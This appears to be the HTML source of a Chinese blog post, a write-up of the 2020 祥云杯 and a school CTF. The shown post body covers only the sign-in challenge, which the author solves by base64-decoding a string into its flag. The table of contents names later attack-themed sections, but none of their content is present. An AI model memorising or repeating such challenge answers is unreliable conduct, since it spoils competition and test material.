@@ -1,0 +1,1471 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.6 -->
+    <script>
+        window.materialVersion = "1.5.6"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0',
+            '1.5.2',
+            '1.5.5'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+
+
+    <link rel="dns-prefetch" href="https://peropero.disqus.com">
+
+
+
+
+
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            祥云杯 校赛 Write-up | 
+        
+        黯梦萦辰
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png">
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png">
+
+    <meta name="format-detection" content="telephone=no">
+    <meta name="description" itemprop="description" content="祥云杯 校内赛 Write-up">
+    <meta name="keywords" content="黯梦萦辰,iyume,tinyume,博客">
+    <meta name="theme-color" content="#0080ff">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.css?bOqB0GgeGicuWzuzm+5PQg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #0080ff;
+    text-decoration: none
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0080ff !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0080ff !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0080ff !important;
+  }
+
+  .toTop {
+    background: #0080ff !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #0080ff;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #0080ff;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #0080ff;
+  }
+
+  .post-toc a:hover {
+    color: #0080ff;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+        #scheme-Paradox .social-btn{
+            cursor:url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/pointer-hand-1.svg), pointer;
+        }
+        .sidebar .sidebar-nav li a {
+            cursor:url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/pointer-hand-1.svg), pointer;
+        }
+        .mdl-button {
+            cursor:url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/pointer-hand-1.svg), pointer;
+        }
+        .MD-burger-icon {
+            cursor:url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/pointer-hand-1.svg), pointer;
+        }
+        #scheme-Paradox .material-layout .mdl-card__media{
+            cursor:url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/pointer-hand-1.svg), pointer;
+        }
+        a:hover{
+            cursor:url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/pointer-hand-1.svg), pointer;
+        }
+        body{
+            background-image: url(https://i.loli.net/2019/09/13/5ZTKgCIyevLOEJ1.png);
+            cursor: url(https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/pointer-click-2.svg),auto;
+        }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="黯梦萦辰">
+    <meta name="msapplication-starturl" content="http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html">
+    <meta name="msapplication-navbutton-color" content="#0080ff">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="黯梦萦辰">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+        
+            <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+        
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="祥云杯 校赛 Write-up | 黯梦萦辰">
+    <meta property="og:image" content="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png">
+    <meta property="og:description" content="祥云杯 校内赛 Write-up">
+    
+
+    
+        <meta property="article:published_time" content="Sun Nov 22 2020 21:17:00 GMT+0800">
+        <meta property="article:modified_time" content="Fri Dec 11 2020 21:00:23 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html">
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script id="myjsonid" type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "mainEntityOfPage": "http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html",
+        "headline": "祥云杯 校赛 Write-up",
+        "datePublished": "Sun Nov 22 2020 21:17:00 GMT+0800",
+        "dateModified": "Fri Dec 11 2020 21:00:23 GMT+0800",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://i.loli.net/2020/11/23/ASHrxb2RhTsZtGy.jpg"
+        },
+        "author": {
+            "@type": "Person",
+            "name": "黯梦萦辰",
+            "image": {
+                "@type": "ImageObject",
+                "url": "https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png"
+            },
+            "description": "仰望半月的夜空"
+        },
+        "publisher": {
+            "@type": "Organization",
+            "name": "黯梦萦辰",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png"
+            }
+        },
+        "keywords": "黯梦萦辰,iyume,tinyume,博客",
+        "description": "祥云杯 校内赛 Write-up"
+    }
+</script>
+<script>
+    roundsum = Math.round(Math.random()*"19"+1);
+    testvar = document.getElementById("myjsonid");
+</script>
+
+    
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-W2644L9');</script>
+    <!-- End Google Tag Manager -->
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+    
+    <!-- jsDelivr DisqusJS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.2/dist/disqusjs.css">
+    <script src="https://cdn.jsdelivr.net/npm/disqusjs@1.1/dist/disqus.js"></script>
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span id="MD-burger-id" class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W2644L9" height="0" width="0"
+        style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<!-- Post TOC -->
+
+
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#祥云杯"><span class="post-toc-number">1.</span> <span class="post-toc-text">祥云杯</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#签到题"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">签到题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#还是原来的-Ping-？"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">还是原来的 Ping ？</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flaskbot"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">flaskbot</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Pin-码-Getshell"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">Pin 码 Getshell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#直接寻找-flag"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">直接寻找 flag</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注意点"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">注意点</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">2.</span> <span class="post-toc-text">总结</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#校赛"><span class="post-toc-number">3.</span> <span class="post-toc-text">校赛</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Not-only-base64"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">Not only base64</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web-第二题"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">Web 第二题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web-第三题"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">Web 第三题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc-1"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">Misc 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc-2"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">Misc 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc-3"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">Misc 3</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Misc-4"><span class="post-toc-number">3.7.</span> <span class="post-toc-text">Misc 4</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Reverse"><span class="post-toc-number">3.8.</span> <span class="post-toc-text">Reverse</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AWD"><span class="post-toc-number">3.9.</span> <span class="post-toc-text">AWD</span></a></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+<!-- Post Module -->
+<div class="material-post_container">
+
+    <div class="material-post mdl-grid">
+        <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+            <!-- Post Header(Thumbnail & Title) -->
+            
+    <!-- Paradox Post Header -->
+    
+        <!-- Custom Thumbnail -->
+        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://i.loli.net/2020/11/23/ASHrxb2RhTsZtGy.jpg)">
+    
+            <p class="article-headline-p">
+                祥云杯 校赛 Write-up
+            </p>
+        </div>
+
+
+
+
+
+            
+            <!-- Paradox Post Info -->
+            <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>黯梦萦辰</strong>
+        <span>11月 22, 2020</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAACvElEQVR42u3aUW4DIQwFwNz/0u0BqtBnm1YbGL4idcMyRKrFM6+vK8cLGxsbGxsbGxsb+5HsVzx+fuvdPOv51+9dzz9aMzY2NvbR7F/+9QfP5Jg1L3l781vY2NjYF7CTctIrHsl3k+d7a8bGxsbGTj7nT062FRsbGxv7P9m94jfZRGxsbGzsJKBZHx7Wc+bzVJsTf56lYWNjYz+enZeW53z+1/42NjY29oPZ1TGJ8qtP9prNb2fAxsbGPpRdjebzg8TkgDEJp7CxsbFvY68Xl1+7mVzK2VvA3r4LGxsb+1D2rnLSaw/kP8B6iyMRNjY29tHsZHF7jyWTv1ZLIzY2NvbZ7GpwnxSS6iWbapu5GYRhY2NjH8pOpphHPPmc+YXLausXGxsb+2x2fsmyeozphVb5lhXCJmxsbOyj2Uk81DsMJEeL3ru+igMbGxv7VPak/MwvRJaDobjQlrM0bGxs7A9nF77cKlTVNkO1CRGFVtjY2NgXsKvhzgQ2by0kq8XGxsa+gZ0fG3qL3tv67TUqsLGxsc9mV6OiCW9+qOitEBsbG/tOdlIScvxfzJ83jLGxsbFvYPcm3RXo936A/L3Y2NjYN7DzMQ+Akk2p8rCxsbGxk9dPAL0t21wUsbGxsQ9l59FMdWvmLeRJzISNjY2NnUT8SdmolrT1YaN60QcbGxv7Nvb82JCXvb3BEzY2NjZ2NXBPrsj0ll5t7haOUtjY2NiHsnuN3h5jtOjW5R5sbGzsG9iveFQ3ZRQAxZdB803ExsbGPpudYHaVq+qlybyA/aLAxsbGvoCdFIPkr5NtnWzf6PIlNjY29sXsScTfawlvPopgY2NjX8mex1LVsClvHmy+soONjY39UexqkzWJe/JGQrKteXMXGxsb+zb2/GJN9cCQNxUmYRM2Njb2Dex7BjY2NjY2NjY2NvZjxjdE8AGTS4cfeQAAAABJRU5ErkJggg==">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a rel="external nofollow" class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=祥云杯 校赛 Write-up&url=http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html&pic=http://blog.tinyume.comhttps://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a rel="external nofollow" class="post_share-link" href="https://twitter.com/intent/tweet?text=祥云杯 校赛 Write-up&url=http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html&via=黯梦萦辰" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a rel="external nofollow" class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a rel="external nofollow" class="post_share-link" href="https://plus.google.com/share?url=http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+        <a rel="external nofollow" class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html&title=祥云杯 校赛 Write-up" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 LinkedIn
+            </li>
+        </a>
+    
+
+    <!-- Share QQ -->
+    
+        <a rel="external nofollow" class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=黯梦萦辰&title=祥云杯 校赛 Write-up&summary=仰望半月的夜空&pics=http://blog.tinyume.comhttps://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/avatar.png&url=http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+        <a rel="external nofollow" class="post_share-link" href="https://telegram.me/share/url?url=http://blog.tinyume.com/archives/xiang-yun-bei-xiao-sai-ctf-write-up.html&text=祥云杯 校赛 Write-up" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Telegram
+            </li>
+        </a>
+    
+</ul>
+
+    
+</div>
+
+            
+            <style>
+                .post-preface {
+                    margin: 15px 0 0 4%;
+                }
+
+                .post-preface-count,
+                .post-preface-minread,
+                .post-preface-categories {
+                    border-radius: 10px;
+                    margin: 7px 3px 5px;
+                    padding: 5px 10px;
+                    font-size: 14px;
+                    color: white;
+                    display: inline-block;
+                    letter-spacing: 1px;
+                }
+
+                .post-preface-count {
+                    background-color: #ff4e6a;
+                }
+
+                .post-preface-minread {
+                    background-color: #ffaa73;
+                }
+
+                .post-preface-categories {
+                    background-color: #3cdc82;
+                }
+
+                .category-link {
+                    text-decoration: none;
+                }
+
+                .category-link:hover,
+                .category-link:link,
+                .category-link:visited,
+                .category-link:active {
+                    color: white;
+                }
+
+                .post-preface-icons {
+                    filter: invert(100%);
+                }
+            </style>
+            <div class="post-preface">
+                <span class="post-preface-count">
+                    <i>
+                        <img class="post-preface-icons"
+                            src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-count.svg">
+                    </i>
+                    &nbsp;3.2k字
+                </span>
+                <span class="post-preface-minread">
+                    <i>
+                        <img class="post-preface-icons"
+                            src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-minread.svg">
+                    </i>
+                    &nbsp;大约13分钟
+                </span>
+                
+                <span class="post-preface-categories">
+                    <i>
+                        <img class="post-preface-icons"
+                            src="https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-categories-1.svg">
+                    </i>
+                    &nbsp;<a class="category-link" href="/categories/代码/">代码<span class="category-count">10</span></a>, <a class="category-link" href="/categories/日常/">日常<span class="category-count">10</span></a>
+                </span>
+                <script>
+                    for (i = 0; i < document.getElementsByClassName("category-link").length; i++) {
+                        document.getElementsByClassName("category-link")[i].innerHTML = document.getElementsByClassName(
+                            "category-link")[i].innerHTML.replace(/[0-9]/g, '');
+                    }
+                </script>
+                
+            </div>
+            <!-- Post Content -->
+            <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>祥云杯 校内赛 Write-up</p>
+<a id="more"></a>
+<h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><blockquote>
+<p>比赛时间：2020.11.21 9:00 - 2020.11.22 21:00<br>比赛形式：CTF</p>
+</blockquote>
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>ZmxhZ3txcV9ncm91cF84MjY1NjYwNDB9<br>目测<code>base64</code>加密，解密得到<code>flag</code></p>
